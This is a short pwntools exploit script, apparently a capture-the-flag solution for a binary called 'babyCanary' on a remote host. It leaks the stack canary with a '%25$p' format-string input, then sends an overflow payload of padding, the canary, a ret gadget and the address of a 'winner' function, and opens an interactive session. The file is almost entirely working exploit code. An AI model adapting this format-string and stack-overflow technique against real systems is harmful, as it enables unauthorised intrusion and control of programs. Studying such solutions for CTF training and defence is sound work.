from pwn import *

#elf = context.binary = ELF("./babyCanary")
#p=process("./babyCanary")

p=remote("3.101.12.127", 5004)


#log.info(p.clean())
p.recvline()
p.recvline()
p.sendline('%25$p')
p.recvline()
canary = int(p.recvline(), 16)

log.success(f'Canary: {hex(canary)}')

ret = 0x000000000040101a
winner = 0x00000000004011f6
payload = b'a'*152   # padding upto canary
payload += p64(canary)
payload += b'a'*8    # canary to return address padding
#payload += p64(ret) + p64(elf.sym.winner)
payload += p64(ret) + p64(winner)

#print(payload)
p.recvline()
p.sendline(payload)
p.interactive()
